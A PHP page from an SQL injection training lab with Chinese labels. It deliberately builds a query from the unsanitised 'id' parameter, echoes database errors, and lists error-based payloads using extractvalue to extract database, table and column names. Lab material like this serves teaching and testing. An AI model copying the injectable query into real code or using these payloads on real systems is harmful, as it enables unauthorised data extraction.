<?php
header("Content-Type: text/html; charset=utf-8");
$mysqli = new mysqli("db", "sqli", "sqli123", "sqli_lab");
$mysqli->set_charset("utf8mb4");

if ($mysqli->connect_error) {
    die("連線失敗: " . $mysqli->connect_error);
}

$id = $_GET['id'] ?? '';

$query = "SELECT title FROM items WHERE id = '$id'";
echo "<h2>🧪 Error-based SQL Injection 測試</h2>";
echo "<p><strong>執行的 SQL：</strong><code>" . $query . "</code></p>";

$result = $mysqli->query($query);

if ($result) {
    if ($result->num_rows > 0) {
        while ($row = $result->fetch_assoc()) {
            echo "<h3>標題：{$row['title']}</h3>";
        }
    } else {
        echo "<p style='color:red;'>❌ 找不到資料</p>";
    }
} else {
    echo "<p style='color:red;'>❌ SQL 錯誤：{$mysqli->error}</p>";
}
?>

<h3>💡 建議測試 Payload：</h3>
<ul>
  <li><code>1'</code> ← 單引號錯誤測試</li>
  <li><code>1"</code> ← 雙引號錯誤測試</li>
  <li><code>' and extractvalue(0x0a,concat(0x0a,(select database())))--+</code> ← 顯示目前資料庫</li>
  <li><code>' and extractvalue(0x0a,concat(0x0a,(select table_name from information_schema.tables where table_schema=database() limit 0,1)))--+</code> ← 顯示第一張資料表</li>
  <li><code>' and extractvalue(0x0a,concat(0x0a,(select column_name from information_schema.columns where table_name='items' limit 0,1)))--+</code> ← 顯示 items 表的第一個欄位</li>
</ul>
